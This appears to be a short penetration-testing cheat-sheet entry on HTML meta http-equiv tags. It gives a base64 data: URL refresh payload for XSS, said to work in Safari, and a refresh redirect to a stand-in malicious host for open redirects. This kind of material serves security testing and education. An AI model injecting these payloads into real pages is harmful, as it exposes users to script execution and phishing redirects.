The [&lt;meta&gt;](https://developer.mozilla.org/en-US/docs/Web/HTML/Element/meta) tag represents metadata that cannot be represented by other HTML meta-related elements.

Some `<meta>` tags are informational, for example:

```html
<meta name="name" content="content">
```

And some affect the page in some way, for example:

```html
<meta http-equiv="content-security-policy" content="default-src 'none'; base-uri 'self'">
```

Moreover, CSP does not regulate such `<meta>` elements. `<meta http-equiv=...>` is a tag on the page that may emulate a subset of functions normally reserved for page headers. Similarly, some of these functions appear in Javascript, which is already heavily regulated by CSP. Dangerous functions that can be performed by `<meta http-equiv=...>` include:
- set-cookie,
- refresh:
    - redirect to any regular URL,
    - redirect to any data: URL.

> set-cookie instruction was removed from the standard, and is no longer supported at all in Firefox 68 and Chrome 65.

# XSS

We can use the `<meta>` tag with `content = "0; data: "` URI to execute arbitrary Javascript code (works only on safari), for example:

```html
<meta name="language" content="0;data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==" http-equiv="refresh"/>
```

Firefox and Chrome will block this:
- Not allowed to navigate top frame to data URL (Firefox)
- Navigation to toplevel data: URI not allowed (Chrome)

# Open redirect

Using a similar payload, you can redirect the victim to an malicious page:

```html
<meta name="language" content="5;http://malicious-website.com" http-equiv="refresh"/>
```

# References

- [&lt;meta&gt; and &lt;iframe&gt; tags chained to SSRF](https://medium.com/@know.0nix/hunting-good-bugs-with-only-html-d8fd40d17b38)